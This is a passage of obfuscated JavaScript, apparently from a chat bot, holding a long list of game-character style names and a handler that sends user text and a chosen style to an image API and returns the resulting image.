x1ce978[_0x240d04(0x12fe)],_0x1ce978['pIQJU'],_0x240d04(0x731),_0x1ce978['asGWF'],_0x1ce978[_0x240d04(0xb16)],_0x1ce978[_0x240d04(0x207d)],_0x1ce978['tLpne'],'shen-5',_0x240d04(0x1230),_0x1ce978[_0x240d04(0x20f0)],_0x1ce978[_0x240d04(0xe37)],_0x1ce978[_0x240d04(0x45e)],_0x1ce978[_0x240d04(0x1a8e)],_0x1ce978['kShrI'],_0x1ce978[_0x240d04(0x12fa)],_0x1ce978[_0x240d04(0x1906)],_0x1ce978[_0x240d04(0x1eac)],_0x1ce978[_0x240d04(0x13f6)],_0x240d04(0x20c8),_0x1ce978[_0x240d04(0x288f)],_0x240d04(0x16a7),_0x1ce978[_0x240d04(0x78f)],_0x1ce978[_0x240d04(0x2522)],_0x1ce978[_0x240d04(0x2989)],_0x240d04(0x557),_0x1ce978[_0x240d04(0xd5b)],_0x1ce978[_0x240d04(0x873)],_0x1ce978[_0x240d04(0x18d2)],_0x1ce978['vrEYy'],_0x240d04(0x1088),_0x1ce978[_0x240d04(0x20f4)],_0x1ce978[_0x240d04(0x1c83)],_0x1ce978[_0x240d04(0x175f)],_0x1ce978[_0x240d04(0x206c)],_0x1ce978[_0x240d04(0x200c)],_0x1ce978[_0x240d04(0x17f7)],_0x1ce978[_0x240d04(0x24e)],_0x1ce978[_0x240d04(0x233e)],_0x1ce978['YypfQ'],_0x1ce978[_0x240d04(0x7d1)],'rumble-3',_0x240d04(0x2a1),_0x1ce978['CToNJ'],'rumble-0',_0x1ce978[_0x240d04(0x18a7)],_0x240d04(0x1739),_0x240d04(0x3ba),_0x1ce978[_0x240d04(0x220e)],_0x240d04(0x1bea),_0x1ce978[_0x240d04(0x13c3)],_0x1ce978['penli'],_0x1ce978[_0x240d04(0x188a)],_0x1ce978[_0x240d04(0x2a9b)],_0x1ce978[_0x240d04(0x17d8)],_0x1ce978[_0x240d04(0x27e2)],_0x1ce978['gapBW'],_0x1ce978[_0x240d04(0x2469)],_0x1ce978['liYVL'],_0x1ce978['IhPHy'],_0x240d04(0x1e5c),_0x1ce978[_0x240d04(0x1ba8)],'renekton-5',_0x1ce978[_0x240d04(0x1c97)],_0x240d04(0x1451),_0x1ce978[_0x240d04(0x1c0f)],_0x1ce978['IKggD'],_0x1ce978[_0x240d04(0xb1c)],_0x1ce978[_0x240d04(0x205)],_0x1ce978[_0x240d04(0xbab)],_0x240d04(0xb4a),_0x1ce978['FXPvy'],_0x1ce978[_0x240d04(0x1c9e)],_0x1ce978['AJzRX'],_0x1ce978[_0x240d04(0x1118)],_0x240d04(0x10d6),_0x1ce978['TTsfR'],_0x240d04(0x2ef1),_0x1ce978[_0x240d04(0x2ae7)],_0x1ce978[_0x240d04(0xa2e)],_0x1ce978['aoiqw'],_0x1ce978[_0x240d04(0x82f)],_0x240d04(0x1058),_0x1ce978[_0x240d04(0x1f11)],_0x1ce978[_0x240d04(0x2d29)],_0x1ce978[_0x240d04(0x1109)],_0x1ce978['fiMoQ'],_0x1ce978[_0x240d04(0xf69)],_0x1ce978['EjKoW'],_0x1ce978['qREUV'],_0x1ce978[_0x240d04(0x256)],_0x1ce978[_0x240d04(0x294d)],_0x1ce978[_0x240d04(0x2912)],_0x1ce978[_0x240d04(0xfd8)],_0x1ce978[_0x240d04(0x157c)],_0x1ce978[_0x240d04(0x6ee)],_0x240d04(0x11c2),_0x1ce978[_0x240d04(0x36a)],_0x1ce978[_0x240d04(0xdb6)],_0x1ce978['AHNRp'],_0x240d04(0x13b5),_0x1ce978[_0x240d04(0x20c5)],_0x1ce978[_0x240d04(0x7ea)],_0x240d04(0x2599),_0x240d04(0xf7d),_0x1ce978['fBhKh'],_0x1ce978[_0x240d04(0x2df8)],_0x240d04(0x54c),_0x1ce978[_0x240d04(0x360)],_0x240d04(0x1f28),_0x240d04(0x1add),_0x1ce978['UAdkY'],_0x1ce978[_0x240d04(0x220)],_0x1ce978['wBCfe'],_0x1ce978[_0x240d04(0x85c)],_0x1ce978[_0x240d04(0xc18)],_0x1ce978[_0x240d04(0x1d82)],_0x1ce978['uUzMC'],_0x1ce978[_0x240d04(0x21bd)],_0x1ce978['znILt'],'nunu-5',_0x1ce978[_0x240d04(0xbb9)],_0x1ce978[_0x240d04(0x2d63)],_0x1ce978['VTKNW'],_0x1ce978[_0x240d04(0x1d83)],_0x1ce978['PDjQD'],_0x240d04(0x2c2d),_0x240d04(0x870),_0x1ce978[_0x240d04(0x2b97)],_0x1ce978[_0x240d04(0x1a17)],_0x1ce978[_0x240d04(0x16f0)],_0x1ce978[_0x240d04(0x412)],_0x1ce978['bSEvI'],_0x1ce978[_0x240d04(0x2b39)],_0x1ce978['VEOyS'],_0x1ce978[_0x240d04(0x70d)],_0x1ce978[_0x240d04(0x1cd3)],_0x240d04(0x1bf2),_0x240d04(0x23de),_0x1ce978[_0x240d04(0x80c)],_0x1ce978[_0x240d04(0xbba)],'nidalee-0',_0x240d04(0x1345),_0x1ce978[_0x240d04(0xfe8)],_0x1ce978[_0x240d04(0x19a4)],_0x1ce978[_0x240d04(0xda0)],_0x240d04(0x1e47),_0x1ce978['rIVuB'],_0x240d04(0x1321),_0x1ce978[_0x240d04(0x120d)],_0x1ce978[_0x240d04(0x28a9)],_0x1ce978[_0x240d04(0x3b1)],_0x1ce978[_0x240d04(0x194c)],_0x1ce978['INYpR'],_0x1ce978[_0x240d04(0xc79)],_0x1ce978['IdxiA'],_0x1ce978[_0x240d04(0xb5c)],_0x240d04(0x196e),_0x240d04(0x4f6),_0x1ce978[_0x240d04(0x1890)],_0x1ce978[_0x240d04(0x23fd)],_0x240d04(0x249a),_0x1ce978[_0x240d04(0xc76)],_0x1ce978[_0x240d04(0x15e6)],_0x240d04(0x28e0),_0x1ce978[_0x240d04(0x1bf4)],_0x240d04(0x16c6),_0x1ce978[_0x240d04(0x2416)],_0x240d04(0x3fd),_0x1ce978[_0x240d04(0xeec)],_0x1ce978[_0x240d04(0x1756)],_0x240d04(0x1cfe),_0x1ce978[_0x240d04(0x20bd)],_0x1ce978[_0x240d04(0x2298)],_0x1ce978['twCVw'],_0x1ce978[_0x240d04(0x2637)],_0x240d04(0x2c27)+'r-1',_0x240d04(0x2c27)+_0x240d04(0x11d3),_0x1ce978['hoqbe'],_0x1ce978['hZOkM'],_0x1ce978[_0x240d04(0x1d27)],_0x1ce978[_0x240d04(0x20ca)],_0x240d04(0x9b6)+'-1',_0x1ce978[_0x240d04(0xa0a)],_0x1ce978[_0x240d04(0x2e62)],_0x1ce978[_0x240d04(0x4cb)],_0x1ce978[_0x240d04(0x2b60)],_0x1ce978['cYSKR'],_0x1ce978[_0x240d04(0xbed)],'nissfortun'+_0x240d04(0x2c42),'nissfortun'+_0x240d04(0x1a1),_0x1ce978[_0x240d04(0x1781)],_0x1ce978[_0x240d04(0x18ca)],_0x1ce978[_0x240d04(0x270d)],_0x1ce978['hftcD'],_0x240d04(0x2898),_0x1ce978[_0x240d04(0x23a7)],_0x1ce978[_0x240d04(0x2ef0)],_0x1ce978['eWJpj'],'nasteryi-5',_0x1ce978['RnQuV'],_0x240d04(0x2ee9)+'0',_0x1ce978[_0x240d04(0xfe1)],_0x240d04(0x1d0d),_0x1ce978[_0x240d04(0x1a0e)],_0x1ce978[_0x240d04(0x210c)],_0x1ce978[_0x240d04(0x28ba)],'naokai-2',_0x240d04(0x2976),_0x1ce978[_0x240d04(0x2e85)],_0x240d04(0x13ee),_0x1ce978[_0x240d04(0x1076)],_0x1ce978['GjMPY'],'nalzahar-2',_0x240d04(0xb1b),_0x1ce978[_0x240d04(0x1ceb)],_0x1ce978['yJouW'],_0x1ce978[_0x240d04(0x15ad)],_0x1ce978[_0x240d04(0x71e)],_0x1ce978['HjMAd'],_0x1ce978[_0x240d04(0x13e2)],_0x240d04(0x1ec6),_0x240d04(0x193d),_0x1ce978[_0x240d04(0x16ef)],_0x1ce978[_0x240d04(0x816)],_0x1ce978['XcHcx'],_0x1ce978[_0x240d04(0x1dde)],_0x1ce978[_0x240d04(0x1f85)],_0x1ce978['WGytz'],_0x1ce978['JKMML'],_0x1ce978[_0x240d04(0xe79)],_0x1ce978[_0x240d04(0x1337)],_0x1ce978[_0x240d04(0x21cb)],_0x1ce978[_0x240d04(0xb2f)],_0x1ce978[_0x240d04(0xb38)],_0x1ce978['yPmum'],_0x240d04(0x240d),_0x1ce978[_0x240d04(0x8ea)],_0x1ce978[_0x240d04(0xdc2)],_0x240d04(0x3e0),_0x1ce978['RYGXN'],_0x1ce978['shaHn'],_0x1ce978[_0x240d04(0x270a)],_0x240d04(0x2488),_0x1ce978['pCjwy'],_0x1ce978['vSiCN'],_0x240d04(0x1186)+'1',_0x1ce978[_0x240d04(0xb06)],_0x1ce978[_0x240d04(0x10e6)],_0x1ce978['ucXnH'],_0x1ce978['LYziy'],'leona-6',_0x240d04(0xdc),_0x1ce978[_0x240d04(0x1a8b)],_0x240d04(0x2907),_0x1ce978[_0x240d04(0x1b0)],_0x1ce978[_0x240d04(0x2d37)],_0x1ce978[_0x240d04(0xe2c)],_0x1ce978['vPKZu'],_0x1ce978[_0x240d04(0x1870)],_0x1ce978[_0x240d04(0x1b96)],_0x1ce978['cbHlj'],_0x1ce978[_0x240d04(0x14da)],_0x1ce978[_0x240d04(0x1c2d)],_0x1ce978['LGVOE'],_0x1ce978[_0x240d04(0x2918)],_0x1ce978['rHSjR'],_0x240d04(0x5f6),_0x1ce978[_0x240d04(0x1cd1)],_0x240d04(0x1f8),_0x1ce978[_0x240d04(0x1cb5)],_0x1ce978['PHOMW'],_0x1ce978[_0x240d04(0x61b)],_0x1ce978[_0x240d04(0x1b8e)],_0x240d04(0x1215),_0x1ce978[_0x240d04(0xde5)],_0x1ce978[_0x240d04(0xb68)],_0x240d04(0x2d7d),_0x240d04(0xf98),_0x1ce978[_0x240d04(0xd65)],'kogmaw-2','kogmaw-1',_0x240d04(0x378),_0x1ce978[_0x240d04(0x25a9)],_0x1ce978[_0x240d04(0x150e)],_0x1ce978['tdLep'],_0x1ce978['AhPvv'],_0x1ce978[_0x240d04(0x23c9)],_0x240d04(0xef),_0x1ce978[_0x240d04(0x2268)],'khazix-2',_0x1ce978[_0x240d04(0xe6f)],_0x1ce978[_0x240d04(0x2ea5)],_0x1ce978[_0x240d04(0x1885)],_0x1ce978[_0x240d04(0x1586)],_0x1ce978[_0x240d04(0x6c8)],_0x1ce978['pdzMb'],_0x1ce978[_0x240d04(0xf07)],_0x1ce978[_0x240d04(0x2467)],_0x1ce978[_0x240d04(0x266)],_0x1ce978[_0x240d04(0x2cae)],_0x1ce978[_0x240d04(0x11bf)],_0x1ce978[_0x240d04(0x2c80)],_0x1ce978[_0x240d04(0x2d72)],'kayle-5','kayle-4',_0x1ce978[_0x240d04(0x2572)],_0x240d04(0x975),_0x1ce978[_0x240d04(0x28f6)],_0x1ce978[_0x240d04(0x14cc)],_0x240d04(0x2a94),_0x240d04(0x5f7),_0x1ce978['TlUPH'],'katarina-5',_0x1ce978[_0x240d04(0x2a8e)],_0x1ce978['PNqSq'],_0x1ce978['KJxKo'],_0x1ce978[_0x240d04(0x812)],_0x240d04(0x143),_0x1ce978[_0x240d04(0x29a1)],_0x1ce978['kEbdH'],_0x1ce978[_0x240d04(0x13b3)],_0x1ce978[_0x240d04(0x14a6)],_0x1ce978[_0x240d04(0x11a7)],_0x240d04(0x2edc),_0x240d04(0x2251),_0x1ce978[_0x240d04(0x2e8e)],_0x1ce978[_0x240d04(0x2be1)],_0x1ce978[_0x240d04(0x1acf)],_0x1ce978[_0x240d04(0x1f37)],_0x1ce978[_0x240d04(0x12bc)],_0x1ce978['cgyda'],_0x1ce978[_0x240d04(0x248b)],_0x1ce978[_0x240d04(0xb05)],_0x240d04(0x62b),_0x1ce978[_0x240d04(0x202)],_0x240d04(0x10f0),_0x240d04(0xb53),_0x1ce978['qydok'],_0x240d04(0x2056),_0x240d04(0x2d0a),_0x1ce978['KBzQj'],_0x1ce978['nqEZQ'],'jinx-4',_0x1ce978[_0x240d04(0x21ad)],_0x1ce978[_0x240d04(0xee1)],_0x240d04(0x235c),_0x1ce978[_0x240d04(0x7c0)],_0x1ce978[_0x240d04(0x21da)],_0x1ce978[_0x240d04(0x1beb)],_0x1ce978['XiUOA'],'jayce-1',_0x1ce978[_0x240d04(0x199f)],_0x1ce978[_0x240d04(0x7da)],_0x240d04(0xbe1),_0x1ce978[_0x240d04(0x73e)],_0x1ce978[_0x240d04(0x399)],_0x1ce978[_0x240d04(0x4eb)],_0x1ce978[_0x240d04(0x238f)],_0x240d04(0x225f),_0x1ce978[_0x240d04(0x5ff)],_0x240d04(0x257f),_0x240d04(0x245),_0x1ce978[_0x240d04(0x1cac)],_0x1ce978[_0x240d04(0xf0e)],_0x1ce978[_0x240d04(0x239b)],_0x1ce978[_0x240d04(0xbf2)],_0x1ce978[_0x240d04(0x14a0)],_0x240d04(0x1ae6),_0x1ce978[_0x240d04(0x2c7e)],_0x1ce978[_0x240d04(0x535)],_0x240d04(0x1aa7),_0x1ce978[_0x240d04(0x22ee)],_0x1ce978[_0x240d04(0xe6a)],_0x1ce978['ZMAdc'],_0x1ce978[_0x240d04(0x1f7f)],_0x1ce978[_0x240d04(0x2631)],_0x1ce978[_0x240d04(0x983)],_0x1ce978[_0x240d04(0x1283)],_0x1ce978[_0x240d04(0x2216)],_0x1ce978[_0x240d04(0x1216)],_0x1ce978[_0x240d04(0x1bef)],_0x1ce978['GJFjV'],_0x240d04(0x2e4f),_0x1ce978['lyVtf'],_0x1ce978[_0x240d04(0x161b)],'illaoi-0',_0x1ce978['oJaJZ'],_0x240d04(0x1555)+_0x240d04(0x1fe4),_0x1ce978[_0x240d04(0x23e4)],_0x1ce978['IJhPb'],'heimerding'+_0x240d04(0x590),_0x1ce978['dYNCR'],_0x1ce978['xzFtl'],_0x1ce978[_0x240d04(0xc35)],_0x1ce978[_0x240d04(0x38a)],_0x1ce978[_0x240d04(0x1bf)],_0x240d04(0x10cc),'hecarim-1',_0x1ce978[_0x240d04(0x1156)],_0x1ce978[_0x240d04(0x214c)],_0x1ce978['wqxha'],_0x240d04(0xad2),_0x1ce978[_0x240d04(0x281c)],_0x240d04(0x189e),_0x1ce978['OEDAp'],_0x1ce978['cKXaE'],_0x1ce978[_0x240d04(0x2b24)],_0x1ce978['VTRxv'],'gragas-8',_0x1ce978['TzclA'],_0x1ce978['xikKe'],_0x1ce978[_0x240d04(0x946)],_0x1ce978[_0x240d04(0xeaf)],_0x1ce978['pIrAA'],_0x1ce978[_0x240d04(0x1889)],_0x240d04(0x37a),_0x1ce978[_0x240d04(0x1277)],_0x1ce978[_0x240d04(0x2be3)],'gnar-4',_0x1ce978['ZAGwi'],_0x1ce978[_0x240d04(0x1c7e)],_0x1ce978['PiQqR'],_0x1ce978['gjMjF'],_0x1ce978[_0x240d04(0x2f6)],_0x1ce978[_0x240d04(0x1400)],_0x1ce978[_0x240d04(0x22ba)],_0x1ce978[_0x240d04(0x8db)],_0x1ce978[_0x240d04(0x645)],_0x1ce978[_0x240d04(0x13db)],_0x1ce978[_0x240d04(0x21dc)],_0x1ce978[_0x240d04(0x1788)],_0x1ce978[_0x240d04(0x120f)],_0x1ce978['PPRpB'],_0x1ce978[_0x240d04(0x7a0)],_0x1ce978['hODjQ'],_0x1ce978[_0x240d04(0x2b33)],_0x1ce978[_0x240d04(0x22f9)],_0x1ce978[_0x240d04(0x9f3)],_0x1ce978[_0x240d04(0xfaf)],_0x1ce978['EXfmc'],_0x1ce978[_0x240d04(0x2c11)],_0x1ce978[_0x240d04(0xb66)],_0x1ce978[_0x240d04(0x27f0)],_0x240d04(0x328),_0x1ce978['phBnM'],_0x1ce978[_0x240d04(0x26cc)],_0x1ce978[_0x240d04(0x1912)],_0x1ce978[_0x240d04(0x20c1)],_0x1ce978['nWkTp'],_0x1ce978['ZlNwM'],_0x1ce978[_0x240d04(0x866)],_0x1ce978[_0x240d04(0x2417)],_0x1ce978[_0x240d04(0xa85)],_0x1ce978[_0x240d04(0x1cf)],_0x240d04(0x7cb),_0x1ce978[_0x240d04(0x1e04)],_0x1ce978['JXogt'],'fiora-2',_0x1ce978[_0x240d04(0x2af0)],_0x1ce978[_0x240d04(0x1168)],_0x240d04(0x83c)+'ks-7',_0x1ce978['gRJuK'],_0x240d04(0x83c)+_0x240d04(0xbf0),_0x1ce978[_0x240d04(0x86b)],_0x1ce978[_0x240d04(0x128)],_0x1ce978['JLnDZ'],_0x1ce978[_0x240d04(0x9e6)],_0x240d04(0x83c)+_0x240d04(0x5b9),_0x1ce978['VwRWt'],_0x1ce978[_0x240d04(0x678)],_0x1ce978[_0x240d04(0x24fd)],_0x1ce978[_0x240d04(0x1805)],_0x240d04(0x2a11),_0x1ce978['EyxGO'],_0x240d04(0x193f),_0x1ce978[_0x240d04(0x1fe2)],_0x1ce978['MSifG'],_0x1ce978[_0x240d04(0x2cfb)],_0x1ce978[_0x240d04(0x75f)],_0x1ce978[_0x240d04(0x1d5f)],_0x1ce978['VAyOv'],_0x1ce978['raFTg'],_0x1ce978['EROcG'],'elise-4',_0x1ce978[_0x240d04(0x2959)],_0x1ce978[_0x240d04(0xa46)],_0x240d04(0x2b0a),_0x1ce978[_0x240d04(0x1df6)],_0x1ce978['VVFJH'],_0x240d04(0x2228),'ekko-1',_0x1ce978[_0x240d04(0x2b7c)],_0x1ce978[_0x240d04(0x22b9)],_0x1ce978['vFdOZ'],_0x1ce978[_0x240d04(0x1dca)],'draven-3',_0x1ce978[_0x240d04(0x938)],_0x240d04(0x1a62),_0x1ce978[_0x240d04(0xe8e)],'drmundo-9',_0x1ce978[_0x240d04(0x1b93)],_0x1ce978[_0x240d04(0x2ccb)],'drmundo-6',_0x1ce978[_0x240d04(0x2d2b)],_0x1ce978['dPlft'],_0x1ce978[_0x240d04(0x2b03)],_0x1ce978[_0x240d04(0xeb)],_0x1ce978['BSssI'],_0x240d04(0x169f),_0x240d04(0x22ec),_0x240d04(0x1e4e),_0x1ce978['SubEE'],_0x1ce978[_0x240d04(0x7cf)],_0x1ce978[_0x240d04(0x2da5)],_0x1ce978[_0x240d04(0x4a3)],_0x1ce978[_0x240d04(0x2ccc)],_0x1ce978[_0x240d04(0x222b)],_0x1ce978[_0x240d04(0x2864)],_0x1ce978['bEBOQ'],_0x1ce978[_0x240d04(0x68d)],_0x1ce978[_0x240d04(0x1e55)],_0x1ce978[_0x240d04(0x24f)],_0x1ce978['ollhv'],_0x1ce978['tbvwK'],_0x1ce978[_0x240d04(0x2d28)],_0x1ce978['DGfHw'],_0x1ce978[_0x240d04(0x906)],_0x1ce978[_0x240d04(0xb12)],_0x1ce978[_0x240d04(0x2bf0)],_0x1ce978['myNZM'],_0x1ce978[_0x240d04(0x4ee)],_0x1ce978['wQyIQ'],_0x1ce978[_0x240d04(0x2bc5)],_0x1ce978[_0x240d04(0x24a1)],_0x1ce978[_0x240d04(0x675)],_0x1ce978['pWVYs'],_0x240d04(0x1a11),_0x1ce978[_0x240d04(0x343)],_0x1ce978[_0x240d04(0x1254)],_0x240d04(0x23a1)+'-2',_0x240d04(0x23a1)+'-1',_0x1ce978[_0x240d04(0x2cc7)],_0x240d04(0x1bf1),_0x1ce978['gBFLG'],_0x1ce978[_0x240d04(0x201d)],_0x1ce978[_0x240d04(0xd57)],_0x1ce978[_0x240d04(0xeea)],_0x1ce978[_0x240d04(0xaf3)],'caitlyn-2',_0x1ce978[_0x240d04(0x1e19)],'caitlyn-0',_0x1ce978['Gvpgp'],_0x1ce978[_0x240d04(0x1239)],_0x1ce978[_0x240d04(0x1da2)],_0x1ce978[_0x240d04(0x73a)],_0x1ce978[_0x240d04(0x17c)],_0x1ce978[_0x240d04(0xf92)],_0x1ce978['oOheq'],_0x1ce978[_0x240d04(0x2352)],_0x1ce978['GGVyh'],_0x240d04(0x2c92),_0x1ce978[_0x240d04(0x2024)],_0x240d04(0x699),_0x1ce978[_0x240d04(0x2075)],_0x240d04(0x2676)+'-7',_0x1ce978[_0x240d04(0x2cd1)],_0x1ce978[_0x240d04(0x9d8)],_0x240d04(0x2676)+'-4',_0x240d04(0x2676)+'-3',_0x1ce978['vdvlY'],_0x1ce978[_0x240d04(0x19b6)],_0x1ce978[_0x240d04(0x1654)],_0x240d04(0x2676)+_0x240d04(0x754),_0x1ce978[_0x240d04(0x1191)],_0x1ce978[_0x240d04(0x1b08)],'bard-4',_0x1ce978['vWnuu'],_0x1ce978[_0x240d04(0x2460)],_0x240d04(0x1ee3),_0x240d04(0xee4),_0x1ce978[_0x240d04(0xddd)],_0x1ce978['wUsBO'],_0x1ce978['BamBI'],'azir-1','azir-0',_0x1ce978[_0x240d04(0xe4a)],_0x1ce978['ydeXs'],_0x1ce978[_0x240d04(0xa3f)],_0x240d04(0xd2e),_0x1ce978['HDecH'],_0x1ce978[_0x240d04(0x77e)],_0x240d04(0x2de8),_0x1ce978[_0x240d04(0x17c7)],_0x1ce978[_0x240d04(0x18bd)],_0x1ce978[_0x240d04(0x1a7)],'ashe-0',_0x1ce978[_0x240d04(0x26f2)],_0x240d04(0x2d97),_0x1ce978['LdYIT'],_0x1ce978['lJlZh'],_0x1ce978[_0x240d04(0x35c)],_0x1ce978[_0x240d04(0x1f54)],_0x1ce978[_0x240d04(0x1d9d)],_0x1ce978[_0x240d04(0x7d2)],_0x1ce978[_0x240d04(0x1ca0)],_0x1ce978[_0x240d04(0x1d6a)],_0x1ce978[_0x240d04(0xcc4)],_0x1ce978['XKZfv'],_0x1ce978['OlaXB'],_0x1ce978[_0x240d04(0x494)],_0x1ce978[_0x240d04(0x3c9)],_0x240d04(0x127c),_0x1ce978[_0x240d04(0x2618)],_0x1ce978[_0x240d04(0x26e6)],_0x1ce978[_0x240d04(0x212d)],_0x1ce978['rWuoo'],_0x1ce978[_0x240d04(0x78c)],_0x1ce978[_0x240d04(0x2e28)],'amumu-5',_0x1ce978[_0x240d04(0x116e)],_0x240d04(0x137d),_0x240d04(0x1f52),_0x1ce978[_0x240d04(0x1b36)],_0x1ce978['FNuUT'],_0x1ce978[_0x240d04(0x177c)],_0x1ce978[_0x240d04(0x791)],_0x1ce978[_0x240d04(0x2c5c)],_0x1ce978[_0x240d04(0xf0a)],_0x240d04(0x125b),_0x1ce978['GViQz'],_0x1ce978[_0x240d04(0x1957)],_0x240d04(0x1cfb),_0x1ce978[_0x240d04(0x11e7)],_0x240d04(0x15a),_0x1ce978[_0x240d04(0x1d8a)],_0x240d04(0xb13),_0x240d04(0xf62),_0x1ce978[_0x240d04(0x1a4)],_0x1ce978[_0x240d04(0x15f8)],_0x1ce978[_0x240d04(0xbd0)],_0x1ce978['rbOjY'],_0x240d04(0x135e),_0x240d04(0x1667),_0x1ce978['dTBcJ'],_0x1ce978['hkxDp'],_0x240d04(0x148),_0x1ce978['LmUCq'],_0x1ce978[_0x240d04(0x11d8)],_0x1ce978[_0x240d04(0x1db6)],_0x1ce978[_0x240d04(0x21b5)],'ahri-0',_0x240d04(0x21e1),_0x1ce978['bvabW'],_0x1ce978['AnMZX'],_0x240d04(0x12e8),_0x240d04(0x2b0),_0x1ce978[_0x240d04(0x2183)],_0x1ce978['hDApr'],_0x240d04(0xc70),_0x1ce978['ATNHi'],_0x1ce978[_0x240d04(0x2d1f)],_0x240d04(0x1b48),_0x1ce978['PbhaG'],_0x1ce978[_0x240d04(0x2454)],_0x1ce978[_0x240d04(0x114)],_0x1ce978['hjVbV'],_0x1ce978['krFYZ'],_0x240d04(0x2d8f),_0x1ce978[_0x240d04(0x2b07)],_0x1ce978[_0x240d04(0x27f9)],_0x1ce978[_0x240d04(0x103c)],_0x1ce978[_0x240d04(0x7e5)],_0x240d04(0x340),_0x1ce978[_0x240d04(0x1f2a)],_0x1ce978[_0x240d04(0x2d90)],_0x1ce978[_0x240d04(0xe7)],_0x240d04(0x7de),_0x1ce978['HZXYO'],_0x1ce978[_0x240d04(0x1b3)],_0x1ce978[_0x240d04(0x1efd)],_0x240d04(0x2a33),_0x1ce978['mxPTj'],_0x1ce978[_0x240d04(0xdd6)],_0x1ce978[_0x240d04(0x28ca)],_0x1ce978[_0x240d04(0x13e6)],_0x1ce978[_0x240d04(0x2a6)],_0x1ce978['HTzMT'],_0x1ce978[_0x240d04(0xf7a)],_0x1ce978['YlkzQ'],_0x240d04(0xa4c),_0x1ce978[_0x240d04(0x2e76)],_0x1ce978[_0x240d04(0x23a0)],_0x1ce978[_0x240d04(0x2e90)],_0x240d04(0x1ecf),_0x240d04(0x25d1),_0x1ce978[_0x240d04(0x1a40)],_0x1ce978[_0x240d04(0x27c2)],_0x1ce978[_0x240d04(0x762)],_0x240d04(0x18de),_0x1ce978[_0x240d04(0x2e92)],_0x240d04(0x1b34),_0x1ce978[_0x240d04(0x2dce)],_0x1ce978[_0x240d04(0x200)],_0x1ce978[_0x240d04(0x1146)],_0x240d04(0x2676)+'-9',_0x1ce978[_0x240d04(0x94b)],_0x1ce978['SpiwS'],_0x1ce978[_0x240d04(0x27e1)],'vi',_0x1ce978['sIdBt'],_0x1ce978['DCYkw'],_0x1ce978['xyWxn'],_0x1ce978[_0x240d04(0x348)],_0x1ce978['ZqXfY'],_0x1ce978['ddECS'],_0x240d04(0x66a),_0x1ce978[_0x240d04(0xf29)],_0x1ce978[_0x240d04(0x1023)],_0x1ce978[_0x240d04(0xb56)],_0x240d04(0x82e),_0x1ce978[_0x240d04(0x19bb)],_0x1ce978[_0x240d04(0x6df)],_0x1ce978[_0x240d04(0x1427)],_0x1ce978['xmJOw'],_0x1ce978['OwvuK'],_0x1ce978['zdkHn'],_0x1ce978[_0x240d04(0x232d)],_0x240d04(0x2de5)+_0x240d04(0x1655),_0x1ce978['qwDwR'],_0x1ce978[_0x240d04(0x4bf)],_0x1ce978['uIJfY'],_0x1ce978['lrGop'],_0x1ce978[_0x240d04(0x2c10)],'lux',_0x1ce978['Ohtzj'],'kaisa',_0x1ce978[_0x240d04(0x1fdf)],_0x240d04(0x8e8),_0x1ce978[_0x240d04(0x5eb)],_0x1ce978['NknLV'],_0x1ce978[_0x240d04(0x1527)],_0x1ce978[_0x240d04(0x2d3)],_0x1ce978[_0x240d04(0x683)],_0x1ce978[_0x240d04(0x2675)],_0x1ce978[_0x240d04(0x126f)],_0x1ce978['rukQV'],_0x240d04(0x1613),'irelia-6',_0x1ce978[_0x240d04(0x19ca)],_0x240d04(0x2d4b),_0x1ce978[_0x240d04(0x21fc)],_0x1ce978[_0x240d04(0x1f78)],_0x1ce978[_0x240d04(0x230e)],'shen',_0x1ce978['CMRMg'],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978[_0x240d04(0x1e74)],_0x240d04(0x203e),_0x1ce978['LNQeb'],_0x1ce978[_0x240d04(0x2531)],_0x1ce978['erYSt'],_0x1ce978[_0x240d04(0x613)],_0x240d04(0x112f),_0x1ce978[_0x240d04(0xdd5)],_0x1ce978['FKDLL'],_0x1ce978[_0x240d04(0x21f0)],_0x1ce978['eHKUf'],_0x1ce978[_0x240d04(0x2135)],_0x240d04(0xd86),_0x1ce978['UQsXW'],'nunu-11',_0x1ce978[_0x240d04(0x13f0)],_0x240d04(0x2c97),_0x240d04(0x20a),'lulu',_0x1ce978[_0x240d04(0x62d)],_0x1ce978[_0x240d04(0x1ba5)],_0x1ce978[_0x240d04(0x27c7)],_0x1ce978['rcrbH'],_0x240d04(0x2d2),_0x1ce978['ohCVH'],_0x1ce978[_0x240d04(0x1ae1)],_0x1ce978[_0x240d04(0x41c)],_0x1ce978[_0x240d04(0x265c)],_0x1ce978[_0x240d04(0x2361)],_0x1ce978[_0x240d04(0x1968)],_0x1ce978['XRcsg'],_0x1ce978[_0x240d04(0x2e01)],_0x1ce978[_0x240d04(0x215a)],_0x1ce978[_0x240d04(0x1c64)],_0x1ce978[_0x240d04(0x8a5)],_0x1ce978[_0x240d04(0x2d0b)],_0x1ce978[_0x240d04(0x1e57)],_0x240d04(0x1520),_0x1ce978[_0x240d04(0x1596)],_0x1ce978[_0x240d04(0xb8b)],_0x1ce978['SxBEs'],_0x1ce978[_0x240d04(0x1f88)],_0x240d04(0x4fd),_0x1ce978['XpfMK'],_0x1ce978[_0x240d04(0x53a)],_0x1ce978[_0x240d04(0x2269)],_0x240d04(0x1647),'khazix','kayn-3',_0x1ce978[_0x240d04(0x143d)]];if(!_0x2e0eb8[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978['pOSms'](_0x240d04(0x180c),_0x1ce978[_0x240d04(0x669)])?(_0x1ce978[_0x240d04(0x29a5)](_0x3b497b,_0x240d04(0xb17)+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x2b72)](_0x1b006a,_0x4d5fac)+'*'),delete _0x1cff4e[_0x3f4ff7]):_0x555a99(_0x2e0eb8,_0x2e0eb8[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{if(_0x1ce978[_0x240d04(0x11e2)](_0x1ce978[_0x240d04(0xb93)],_0x240d04(0x4d2))){_0x1ce978[_0x240d04(0x6cf)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x55c5a9=api(_0x240d04(0x10a),_0x1ce978[_0x240d04(0x125c)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x56150e=await _0x1ce978[_0x240d04(0x1fed)](fetch,_0x55c5a9);if(!_0x56150e['ok'])throw await _0x56150e['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x55c5a9},{'caption':lang['ok']});}else{if(!_0x1106a2)return 